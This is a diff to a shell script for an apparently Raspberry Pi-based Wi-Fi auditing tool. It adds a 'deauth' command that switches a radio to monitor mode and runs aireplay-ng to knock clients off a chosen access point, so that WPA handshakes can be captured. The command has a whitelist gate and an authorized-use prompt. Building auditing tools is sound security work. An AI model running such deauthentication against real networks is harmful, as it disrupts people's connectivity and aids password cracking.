@@ -85,6 +85,12 @@ Usage: $PROG <command>
                      Pixie-Dust / PIN attack on a WPS AP; asks the authorized-use
                      ack, pauses capture, and saves a recovered key to loot
   wps list           List WPS-recovered keys
+  deauth BSSID [--client MAC] [--channel N] [--count N] [--yes]
+                     Targeted deauthentication of an AP (knocks a client off so
+                     it reconnects and the capture radio sees the 4-way). Uses
+                     the radio that owns the 'attack' role (pausing capture only
+                     if it shares the one adapter), refuses a whitelisted target,
+                     and asks the authorized-use ack. Authorized use only.
   evil-portal        Evil-portal status (captive-portal rogue AP; authorized use only)
   evil-portal start [--yes]  Start the captive portal on the dongle; asks the
                      authorized-use ack and pauses capture
@@ -2215,6 +2221,86 @@ cmd_wps() {
     esac
 }
 
+## deauth (targeted deauthentication; authorized use only) ##################
+# Knock a client off one AP so it reconnects and the capturing radio sees the
+# 4-way. The planner (venv) refuses a whitelisted target, picks the radio that
+# owns the 'attack' role, and says whether capture must pause (one adapter).
+cmd_deauth() {
+    need_root
+    command -v aireplay-ng >/dev/null 2>&1 \
+        || die "aireplay-ng not installed (part of aircrack-ng)"
+    local bssid="" client="" channel="" count yes=no
+    count=$(cfg deauth.count 8)      # a short burst; a bigger N or 0 = continuous
+    while [ $# -gt 0 ]; do
+        case "$1" in
+            --client) client=$2; shift 2 ;;
+            --channel|-c) channel=$2; shift 2 ;;
+            --count|-n) count=$2; shift 2 ;;
+            --yes|-y) yes=yes; shift ;;
+            --*) die "unknown option for 'deauth': $1" ;;
+            *) [ -z "$bssid" ] || die "one BSSID at a time"; bssid=$1; shift ;;
+        esac
+    done
+    [ -n "$bssid" ] || die "usage: $PROG deauth <BSSID> [--client MAC] [--channel N] [--count N] [--yes]"
+    bssid=$(printf '%s' "$bssid" | tr '[:lower:]' '[:upper:]')
+    valid_mac "$bssid" || die "not a BSSID: $bssid"
+    case "$count" in ''|*[!0-9]*) die "count must be a number (0 = continuous)" ;; esac
+    # Plan it as pi: resolve the attack radio, refuse a whitelisted target, and
+    # decide whether capture must pause. The whitelist is the never-attack gate.
+    local plan
+    plan=$(run_as_pi "$PWN_VENV_PYTHON" -I - "$bssid" "$client" <<'PY'
+import json
+import sys
+from kestrel_pi import deauth, radios
+from kestrel_pi.config import load_config
+
+conf = load_config()
+rconf = (conf or {}).get("radios") or {}
+inv = radios.inventory()
+a = radios.assign_roles(inv, overrides=radios.load_overrides(rconf),
+                        allow_shared_attack=radios.allow_shared_attack(rconf))
+wl = (conf.get("capture") or {}).get("whitelist") or []
+plan = deauth.plan_deauth(sys.argv[1], a, whitelist=wl,
+                          client=(sys.argv[2] if len(sys.argv) > 2 else ""))
+print(json.dumps({"ok": plan.ok, "iface": plan.iface, "pause": plan.pause_capture,
+                  "error": plan.error, "notices": list(plan.notices)}))
+PY
+) || die "could not plan the deauth"
+    [ "$(update_json_get "$plan" ok)" = True ] || die "$(update_json_get "$plan" error)"
+    local iface pause note
+    iface=$(update_json_get "$plan" iface)
+    pause=$(update_json_get "$plan" pause)
+    while IFS= read -r note; do
+        [ -n "$note" ] && log "note: $note"
+    done <<< "$(update_json_get "$plan" notices)"
+    capture_ack "$yes" || { log "not acknowledged; aborting"; return 1; }
+    # Monitor mode on the attack radio, pausing capture only when it is shared.
+    local was_active=no
+    if [ "$pause" = True ] && systemctl is-active --quiet "$PWN_CAPTURE_SERVICE"; then
+        was_active=yes
+        systemctl stop "$PWN_CAPTURE_SERVICE" 2>/dev/null || true
+    fi
+    nmcli device set "$iface" managed no 2>/dev/null || true
+    ip link set "$iface" down 2>/dev/null || true
+    iw dev "$iface" set type monitor 2>/dev/null || true
+    ip link set "$iface" up 2>/dev/null || true
+    [ -n "$channel" ] && iw dev "$iface" set channel "$channel" 2>/dev/null || true
+    local args=(--deauth "$count" -a "$bssid")
+    [ -n "$client" ] && args+=(-c "$client")
+    args+=("$iface")
+    log "deauthing $bssid${client:+ (client $client)} on $iface${channel:+ ch $channel} (count=$count)..."
+    aireplay-ng "${args[@]}" 2>&1 || true
+    # Restore the radio and resume capture if we paused it.
+    ip link set "$iface" down 2>/dev/null || true
+    iw dev "$iface" set type managed 2>/dev/null || true
+    ip link set "$iface" up 2>/dev/null || true
+    nmcli device set "$iface" managed yes 2>/dev/null || true
+    if [ "$was_active" = yes ]; then
+        systemctl start --no-block "$PWN_CAPTURE_SERVICE" 2>/dev/null || true
+    fi
+    log "deauth done"
+}
+
 ## evil-portal (captive-portal rogue AP; authorized use only) ###############
 # Stands up a generic captive portal on the capture dongle: an open SSID, a
 # catch-all DNS, and an operator-supplied (or neutral shipped) portal page that
@@ -2934,6 +3020,7 @@ main() {
         capture) cmd_capture "$@" ;;
         crack) cmd_crack "$@" ;;
         wps) cmd_wps "$@" ;;
+        deauth) cmd_deauth "$@" ;;
         evil-portal) cmd_evil_portal "$@" ;;
         kiosk) cmd_kiosk "$@" ;;
         plugins) cmd_plugins "$@" ;;
